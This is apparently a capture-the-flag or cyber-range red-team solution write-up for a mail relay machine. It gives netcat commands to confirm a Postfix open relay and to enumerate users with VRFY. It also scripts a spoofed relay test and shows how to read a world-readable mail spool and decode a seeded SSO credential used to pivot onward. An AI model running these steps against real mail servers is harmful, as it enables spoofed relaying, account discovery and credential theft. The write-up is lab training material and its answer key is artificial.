# solve_red.md — M2 · itgw-mailrelay
## Red Team Solution Writeup
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M2 — SMTP Open Relay + Exposed Mail Spool
**Vulnerability:** Postfix Open Relay (mynetworks=0.0.0.0/0) + World-Readable Mail Spool
**MITRE ATT&CK:** T1114.001 (Email Collection: Local Email Collection) · T1071.003 (Application Layer Protocol: Mail Protocols)
**Severity:** High
**Kill Chain Stage:** Delivery → Installation (credential harvest)

---

## Objective
Connect to the Postfix open relay on `203.x.x.x:25`, enumerate valid users via VRFY, read the world-readable mail spool for `socanalyst`, extract the `X-Internal-Auth-Token` header value, base64-decode it to obtain the SSO service account credential, and use it to proceed to M3.

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.x.x.x` |
| Service Port | `25` (SMTP) |
| Pivot From | M1 admin dashboard (mail relay host disclosed) |

---

## Step-by-Step Exploitation

### Step 1 — Confirm Open Relay

```bash
nc 203.x.x.x 25
```

Expected banner:
```
220 mail.prabalurja.in ESMTP Postfix (PUL-IT-Relay/2.1)
```

Issue EHLO:
```
EHLO attacker.com
```

Observe: no AUTH requirement in the capabilities list — open relay confirmed.

### Step 2 — Enumerate Valid Users via VRFY

```bash
# Test VRFY for known usernames
echo "VRFY socanalyst" | nc -q2 203.x.x.x 25
echo "VRFY it.admin"   | nc -q2 203.x.x.x 25
echo "VRFY admin"      | nc -q2 203.x.x.x 25
```

A `252` or `250` response confirms the user exists. `550` means no such user.

Expected:
```
252 2.0.0 socanalyst
252 2.0.0 it.admin
```

### Step 3 — Relay Test (Demonstrate Open Relay)

```bash
# Full open relay test — no authentication required
(
  echo "EHLO attacker.com"
  sleep 0.3
  echo "MAIL FROM: <fake@attacker.com>"
  sleep 0.3
  echo "RCPT TO: <socanalyst@prabalurja.in>"
  sleep 0.3
  echo "DATA"
  sleep 0.3
  echo "Subject: Relay Test"
  echo ""
  echo "Open relay confirmed."
  echo "."
  sleep 0.3
  echo "QUIT"
) | nc 203.x.x.x 25
```

A `250 Ok: queued` response confirms the relay accepted the message without authentication.

### Step 4 — Read World-Readable Mail Spool

The mail spool at `/var/mail/socanalyst` is world-readable (chmod 644 — misconfiguration). If you have a shell on the machine (via chaining from M1 or direct SSH), read it directly:

```bash
cat /var/mail/socanalyst
```

Or, if accessing via a mail client capable of reading mbox format:
```bash
# List mail headers only
grep "^X-" /var/mail/socanalyst
grep "^From\|^Subject\|^X-Internal" /var/mail/socanalyst
```

### Step 5 — Extract the Credential Token

Locate the custom header in the seeded email:
```
X-Internal-Auth-Token: c3ZjLWRlcGxveS1zc286U1NPQFByYWJhbCEyMDI0
```

Decode the base64 value:
```bash
echo "c3ZjLWRlcGxveS1zc286U1NPQFByYWJhbCEyMDI0" | base64 -d
```

**Output:**
```
svc-deploy-sso:SSO@Prabal!2024
```

This is the SSO service account credential:
- **Username:** `svc-deploy-sso`
- **Password:** `SSO@Prabal!2024`

This credential is the pivot artifact for **M3 — itgw-sso**.

---

## Proof of Exploitation

1. VRFY command output showing valid user enumeration.
2. Relay test showing `250 Ok: queued` response without authentication.
3. `cat /var/mail/socanalyst` output showing the `X-Internal-Auth-Token` header.
4. `base64 -d` output showing the decoded credential.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | Network Service Discovery | T1046 |
| Collection | Email Collection: Local Email Collection | T1114.001 |
| Command & Control | Application Layer Protocol: Mail Protocols | T1071.003 |
| Credential Access | Unsecured Credentials | T1552 |
